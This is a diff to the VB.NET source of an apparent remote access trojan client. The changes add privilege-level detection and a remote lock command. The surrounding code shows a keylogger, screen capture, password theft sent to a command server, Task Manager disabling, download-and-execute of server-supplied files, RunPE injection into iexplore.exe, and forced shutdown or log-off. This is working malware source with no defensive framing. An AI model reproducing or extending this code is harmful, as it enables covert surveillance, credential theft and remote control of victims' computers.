@@ -5,6 +5,7 @@ Imports System.Management
 Imports System.Timers
 Imports System.Text
 Imports System.ComponentModel
+Imports System.Security.Principal
 
 Public Class Main
     Public Shared Sep As String = "*%|%*" ''Separator
@@ -23,7 +24,8 @@ Public Class Main
     Public StartupKey As String
     Public melts As Boolean = 0
     Public Shared pw As String
-    Public cap As New CRDP
+    Public userRole As Integer ''admin, user, guest, etc.
+    Public cap As New CRDP ''remote screen capture
     Public infostring As String
     Public trust As Boolean = False ''Çan server be trusted (resets every time)
     ''Public caa As New Sr1 ''REMOVED!
@@ -48,6 +50,7 @@ Public Class Main
     Dim o As New KLogger ''keylogger
     Public loggg As String
     Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
+    Private Declare Function LockWorkStation Lib "user32.dll" () As Long
 
     Private Function GetCaption() As String ''get active window title
         Dim Caption As New System.Text.StringBuilder(256)
@@ -111,16 +114,35 @@ Public Class Main
 
 #End If
         C = New SocketClient
-        ForeTimer = New Timers.Timer(500)
+        ForeTimer = New Timers.Timer(1000)
         ConTimer.Start()
         ServeTimer.Start()
         AddHandler ConTimer.Elapsed, AddressOf ConTimer_Tick
         AddHandler ServeTimer.Elapsed, AddressOf ServeTimer_Tick
         AddHandler ForeTimer.Elapsed, AddressOf ForeTimer_Tick
 
+        ''get elevation
 
+        Using identity As WindowsIdentity = WindowsIdentity.GetCurrent()
+            If identity IsNot Nothing Then
+                Dim principal As New WindowsPrincipal(identity)
 
-        '   C.Connect(HOST, port)
+                If principal.IsInRole(WindowsBuiltInRole.SystemOperator) Then
+                    userRole += 8
+                End If
+                If principal.IsInRole(WindowsBuiltInRole.Administrator) Then
+                    userRole += 4
+                End If
+                If principal.IsInRole(WindowsBuiltInRole.User) Then
+                    userRole += 2
+                End If
+                If principal.IsInRole(WindowsBuiltInRole.Guest) Then
+                    userRole += 1
+                End If
+
+            End If
+        End Using
+
         '-----------------------------MELT
         Try
             If melts Then
@@ -190,8 +212,10 @@ Public Class Main
         cpu.NextValue()
     End Sub
 
+
+
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
-        End
+        End ''TODO remove
     End Sub
 
 #Region "Socket Events"
@@ -303,16 +327,18 @@ B:
                     Cursor.Position = New Point(A(1), A(2))
                 Case "%" ''key press
                     SendKeys.SendWait(A(1))
-                Case "close"
-                    End ''close
-                Case "Logoff"
-                    Shell("shutdown -l -t 00", AppWinStyle.Hide)
-                Case "Sleep"
+                Case "close" ''exit instance
+                    End
+                Case "LGF" ''log off
+                    Shell("shutdown -l -t 0", AppWinStyle.Hide)
+                Case "SLP" ''sleep
                     Application.SetSuspendState(PowerState.Suspend, True, False)
-                Case "Restart"
-                    Shell("shutdown -r -t 00", AppWinStyle.Hide)
-                Case "Shutdown"
-                    Shell("shutdown -s -t 00", AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown
+                Case "RST" ''restart
+                    Shell("shutdown -r -t 0", AppWinStyle.Hide)
+                Case "SHD" ''shut down
+                    Shell("shutdown -s -t 0", AppWinStyle.Hide) ''TODO: TEST THESE! and check for alternatives to force shutdown.
+                Case "LCK" ''lock
+                    LockWorkStation
                 Case "GetDrives"
                     C.Send("FileManager" & Sep & getDrives())
                 Case "FileManager"
@@ -345,7 +371,7 @@ B:
                     Dim Sep1 As String = "^&&^" ''First level separator
                     Dim Sep2 As String = "^||^" ''Second level separator
                     Dim allProcess As String = My.Computer.Info.TotalPhysicalMemory & Sep1 & My.Computer.Info.AvailablePhysicalMemory & Sep1
-                    
+
                     allProcess += cpu.NextValue() & Sep1
                     Dim ProcessList As Process() = Process.GetProcesses()
                     Dim responding As String = ""
@@ -454,7 +480,7 @@ B:
                         & Proc.Id & Sep2 _
                         & cp & Sep2 _
                         & Convert.ToString(Proc.WorkingSet64) & Sep2 _
-                        & Proc.MainWindowTitle & Sep2 & _
+                        & Proc.MainWindowTitle & Sep2 &
                         cl & Sep2 _
                         & z & Sep2
                     Next
@@ -506,19 +532,19 @@ B:
                     My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                 Case "EnableTaskManager"
                     My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
-                    'Case "opentto"
-                    '    C.Send("opentto")
-                    'Case "TextToSpeech"
-                    '    Dim SAPI = CreateObject("SAPI.Spvoice")
-                    '    SAPI.speak(A(1))
+                'Case "opentto"
+                '    C.Send("opentto")
+                'Case "TextToSpeech"
+                '    Dim SAPI = CreateObject("SAPI.Spvoice")
+                '    SAPI.speak(A(1))
                 Case "ppww" ''passwords
                     C.Send("ppww" & Sep & "bb" & gpasswords)
                 Case "F" ''run file??
                     My.Computer.FileSystem.WriteAllBytes(A(2), SB(A(1)), False)
                     Process.Start(A(2))
                     C.Send("F")
-                    '    Case "logf"
-                    '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
+                '    Case "logf"
+                '       C.Send("logf" & Yy & getlog(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) & Yy & Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name)
                 Case "openlo" ''keylogger pingback
                     C.Send("openlo")
                 Case "getlog" ''ket keylogs
@@ -553,7 +579,12 @@ B:
                         Case 16
                             mi = "e"
                     End Select
-                    RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & mi, My.Resources.MessageMaker, False) ''ToDO Change path!
+                    Try
+                        RunPE.Run("C:\Program Files (x86)\Internet Explorer\iexplore.exe", "@#@" & A(1) & "@#@" & mi, My.Resources.MessageMaker, False) ''ToDO Change path!
+                    Catch ex As Exception
+                        MsgBox("RunPE fail: " & ex.Message)
+                    End Try
+
                 Case "specs" ''system specs TODO!
                     Dim sp As String = My.Computer.Info.TotalPhysicalMemory
 
@@ -589,7 +620,7 @@ B:
                     AddTo(infostring, String.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds))
 
                     C.Send("specs" & Sep & infostring)
-                    ''ip lan etc
+                ''ip lan etc
 
                 Case "reconnect"
                     C.DisConnect()
@@ -634,7 +665,7 @@ B:
             C.Connect(HOST, port)
         End If
     End Sub
-    Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''çonnect to webserver
+    Private Sub ServeTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs) ''çonnect to lavender web
         trust = False
         Dim response As String
         Try
@@ -654,7 +685,7 @@ B:
             hwrequest.Accept = "*/*"
             hwrequest.AllowAutoRedirect = True
             hwrequest.UserAgent = useragent ''"http_requester/0.1"
-            hwrequest.Timeout = 60000
+            hwrequest.Timeout = 30000
             hwrequest.Method = method
             If hwrequest.Method = "POST" Then
                 hwrequest.ContentType = "application/x-www-form-urlencoded"
@@ -673,7 +704,7 @@ B:
             End If
             hwresponse.Close()
         Catch e As Exception
-            responseData = "An error occurred: " & e.Message
+            responseData = "An error occurred: " & e.Message ''TODO: change to variable sender willl recognize as error
         End Try
         Return responseData
     End Function
